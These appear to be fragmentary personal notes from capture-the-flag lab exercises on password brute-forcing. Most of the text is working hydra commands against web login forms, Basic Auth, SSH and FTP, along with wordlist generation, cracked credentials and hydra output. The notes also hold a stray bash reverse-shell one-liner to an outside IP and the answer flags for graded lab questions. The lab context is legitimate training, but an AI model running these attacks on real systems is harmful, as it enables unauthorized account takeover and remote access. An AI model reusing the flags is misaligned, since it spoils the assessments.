```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt $rhost http-post-form "/Account/login.aspx:__VIEWSTATE=J7%2FrKT%2FRbzXElHvOFArr4HX0BUp05PUs%2Bjl4fN5QtFnsigr6tjwFZkWaUW9RaCNkl5wcaaA9I71WXBKsdywllsO45a8kdE%2BO2GeciLswYLZgMhEIYMOLKvVE1g9%2FuxmOjygsPrfW43YX1axgD3V%2FmbHd2lx7jcwje7Qgkp065G2LekTQ&__EVENTVALIDATION=nIJxL4rdGJE3KYMzFDmVH35CAPYLfmVh68KpFWCfpmOAp8i4dLgnYkYLVP3UEDV8IiIqX6kXoIwujnQvd7xTK1Tbiqg5RF0fYL3q6nazJk37P%2BrLs8lq043TvaeMwGi4uqTkx2onf8prQt9NNxgtS4oXE0haNUx6xQId8O8kqlZfYRAG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

```


```shell-session
hydra -l Brutus -P /usr/share/wordlists/rockyou.txt 10.10.113.49 -s 80 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password."

```

https://typhooncon-knowme.chals.io/
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt https://typhooncon-knowme.chals.io/ http-post-form "/login.php:uname=^USER^&pswd=^PASS^:F=<form name='login'"

```

login: b.gates   password: 4dn1l3M!$

---
**Skills Assessment**
`Questions`:When you try to access the IP shown above, you will not have authorization to access it. Brute force the authentication and retrieve the flag.
```shell-session
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 157.245.37.27 -s 32013 http-get /
```
login: user   password: password
HTB{4lw4y5_ch4n63_d3f4ul7_p455w0rd5}

---
Once you access the login page, you are tasked to brute force your way into this page as well. What is the flag hidden inside?

-> Burpsuit 
user=^USER^&pass=^PASS^
```
hydra -l user -P /usr/share/wordlists/rockyou.txt  -f 157.245.37.27 -s 32013 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"


login: admin   password: 123456

```
login: user   password: harrypotter
HTB{c0mm0n_p455w0rd5_w1ll_4lw4y5_b3_h4ck3d!}

---
```bash
$cupp -i 
Harry
special-characters-end-of-words=Y
LeetMode=Y

$./username-anarchy Harry Potter > user_harry.txt 

hydra -L user_harry.txt -P harry.txt -u -f ssh://46.101.61.42:30971 -t 4

[30971][ssh] host: 46.101.61.42   login: harry.potter   password: H4rry!!!

HTB{4lw4y5_u53_r4nd0m_p455w0rd_63n3r470r}
```
---
```bash
$netstat -antp | grep -i list

$hydra -l g.potter -P rockyou-30.txt -u -f ftp://127.0.0.1

login: g.potter   password: harry

ssh g.potter@IP -p PORT
harry

HTB{1_50l3mnly_5w34r_7h47_1_w1ll_u53_r4nd0m_p455w0rd5}

```

```
hydra -L /usr/share/seclists/Usernames/Names/names.txt
 -P /usr/share/wordlists/rockyou.txt -u -f 188.166.148.4 -s 31100 http-get /
```


`hydra -C wordlist.txt SERVER_IP -s PORT http-get /`

Basic Auth Brute Force - Combined Wordlist

`hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`

Basic Auth Brute Force - User/Pass Wordlists

`hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`

Login Form Brute Force - Static User, Pass Wordlist

`hydra -l Brutus -P /usr/share/wordlists/rockyou.txt -u -f ssh://10.10.113.49:22 -t 4`

SSH Brute Force - User/Pass Wordlists

`hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`


bash -i >& /dev/tcp/10.18.23.152/4242 0>&1
FTP Brute Force - Static User, Pass Wordlist
```
$netstat -antp | grep -i list

(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   

b.gates@bruteforcing-2-440906-6b8f59d777-jq6vk:~

$hydra -l g.potter  -P rockyou-10.txt ftp://127.0.0.1

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-15 13:50:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/
[21][ftp] host: 127.0.0.1   login: m.gates   password: computer
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-15 13:50:49

b.gates@bruteforcing-2-440906-6b8f59d777-jq6vk:~
$ftp 127.0.0.1

Connected to 127.0.0.1.
220 (vsFTPd 3.0.3)
Name (127.0.0.1:b.gates): m.gates

```

```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```
